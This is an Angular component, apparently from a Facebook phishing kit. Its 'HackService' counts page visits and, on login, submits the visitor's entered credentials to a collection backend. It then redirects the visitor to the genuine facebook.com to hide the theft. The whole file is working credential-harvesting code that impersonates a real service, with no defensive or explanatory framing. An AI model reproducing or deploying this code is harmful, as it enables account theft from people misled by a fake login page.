import { Component, OnInit } from '@angular/core';
import { HackService } from '../services/hack.service';
import {Router} from '@angular/router'

@Component({
  selector: 'app-facebook',
  templateUrl: './facebook.component.html',
  styleUrls: ['./facebook.component.css']
})
export class FacebookComponent implements OnInit {

  new_user: any = {}
  user: any = {}

  constructor(private hackService: HackService, private router: Router) {
    this.hackService.pageCount().subscribe(resp=>{
      console.log(resp)
    }, err=>{
      console.log(err)
    })
   }

  login(){
    this.hackService.login(this.user).subscribe(resp=>{
      console.log(resp)
      window.location.href = 'https://facebook.com'
    }, err=>{
      console.log(err)
    })
  }

  newUser(){
    window.location.href = 'https://facebook.com'
  }

  ngOnInit() {
  }

}
